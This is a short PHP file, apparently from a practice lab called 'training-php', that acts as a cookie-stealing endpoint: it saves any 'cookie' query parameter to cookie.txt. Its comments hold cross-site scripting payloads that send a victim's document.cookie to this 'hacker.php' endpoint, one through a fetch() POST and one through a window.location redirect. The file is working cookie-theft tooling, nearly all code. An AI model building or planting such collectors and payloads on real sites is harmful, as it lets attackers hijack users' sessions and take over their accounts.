<?php
if (!empty($_GET['cookie'])) {
    file_put_contents('cookie.txt', $_GET['cookie']);
}
// $input = json_decode(file_get_contents('php://input'), true);
// $key = $input['cookie'];
// file_put_contents('cookie.txt', $key);
// <script>
//      fetch('http://localhost:82/training-php/hacker.php', {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json',
//             'Accept': 'application/json',
//         },
//         body: JSON.stringify({cookie: document.cookie})
//     });
// </script>
?>
<!-- 
<script>
    window.location = "http://localhost:82/training-php/hacker.php?cookie=" + document.cookie
</script>" -->